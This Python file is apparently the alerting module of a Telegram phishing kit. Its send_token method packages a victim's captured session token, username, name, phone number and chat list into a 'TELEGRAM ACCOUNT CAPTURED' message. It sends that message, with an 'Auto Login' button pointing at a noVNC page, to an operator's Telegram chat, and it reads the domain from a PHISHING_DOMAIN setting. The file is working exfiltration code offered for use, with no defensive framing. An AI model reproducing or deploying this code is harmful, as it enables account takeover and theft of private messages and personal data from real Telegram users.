#!/usr/bin/env python3
"""
Telegram Bot - Simple, working alerts
"""

import requests
import json
import os
from pathlib import Path
from typing import Optional


class TelegramBot:
    def __init__(self, bot_token: str, chat_id: str, domain: str = "localhost"):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.domain = domain
        self.api_url = f"https://api.telegram.org/bot{bot_token}"
        self.sent: set = set()
    
    @property
    def is_configured(self) -> bool:
        return bool(self.bot_token and self.chat_id)
    
    def send_message(self, text: str, buttons: list = None) -> bool:
        """Send text message"""
        if not self.is_configured:
            return False
        
        payload = {
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        
        if buttons:
            payload["reply_markup"] = json.dumps({"inline_keyboard": buttons})
        
        try:
            r = requests.post(f"{self.api_url}/sendMessage", json=payload, timeout=10)
            print(f"[TG] sendMessage: {r.status_code}", flush=True)
            return r.status_code == 200
        except Exception as e:
            print(f"[TG] Error: {e}", flush=True)
            return False
    
    def send_file(self, file_path: str, caption: str = "", buttons: list = None) -> bool:
        """Send file"""
        file_path = str(file_path)
        if not self.is_configured or not Path(file_path).exists():
            print(f"[TG] File check failed: configured={self.is_configured}, exists={Path(file_path).exists()}", flush=True)
            return False
        
        try:
            print(f"[TG] Uploading: {file_path}", flush=True)
            print(f"[TG] File size: {Path(file_path).stat().st_size}", flush=True)
            
            # Read file into memory first
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            files = {'document': (Path(file_path).name, file_data)}
            data = {
                'chat_id': self.chat_id,
                'caption': caption,
                'parse_mode': 'HTML'
            }
            if buttons:
                data['reply_markup'] = json.dumps({"inline_keyboard": buttons})
            
            print(f"[TG] Posting to API...", flush=True)
            r = requests.post(f"{self.api_url}/sendDocument", files=files, data=data, timeout=60)
            print(f"[TG] sendDocument: {r.status_code}", flush=True)
            if r.status_code != 200:
                print(f"[TG] Response: {r.text[:200]}", flush=True)
            return r.status_code == 200
        except Exception as e:
            print(f"[TG] File error: {e}", flush=True)
            import traceback
            traceback.print_exc()
            return False
    
    def send_token(self, session_id: str, token: str, user_info: dict = None) -> bool:
        """Send Telegram token with user info"""
        if session_id in self.sent:
            return False
        self.sent.add(session_id)
        
        # Build message
        text = "🔐 <b>TELEGRAM ACCOUNT CAPTURED</b>\n\n"
        
        if user_info and "error" not in user_info:
            text += f"👤 <b>User:</b> {user_info.get('username', 'Unknown')}\n"
            if user_info.get('first_name'):
                text += f"📝 <b>Name:</b> {user_info.get('first_name')} {user_info.get('last_name', '')}\n"
            if user_info.get('phone'):
                text += f"📱 <b>Phone:</b> {user_info.get('phone')}\n"
            
            chats = user_info.get('chats', [])
            if chats:
                text += f"\n💬 <b>Chats ({len(chats)}):</b>\n"
                for chat in chats[:5]:
                    text += f"  • {chat['name']}\n"
                if len(chats) > 5:
                    text += f"  ... and {len(chats) - 5} more\n"
        
        text += f"\n🔑 <b>Token:</b>\n<code>{token}</code>\n\n"
        text += "Click to auto-login:"
        
        # Use IP or domain
        domain = self.domain if self.domain != "localhost" else "127.0.0.1"
        buttons = [[{"text": "🚀 Auto Login", "url": f"http://{domain}:6080/vnc.html"}]]
        
        return self.send_message(text, buttons)


# Singleton
_bot: Optional[TelegramBot] = None

def get_bot() -> TelegramBot:
    global _bot
    if _bot is None:
        _bot = TelegramBot(
            os.environ.get("TELEGRAM_BOT_TOKEN", ""),
            os.environ.get("TELEGRAM_CHAT_ID", ""),
            os.environ.get("PHISHING_DOMAIN", "localhost")
        )
    return _bot
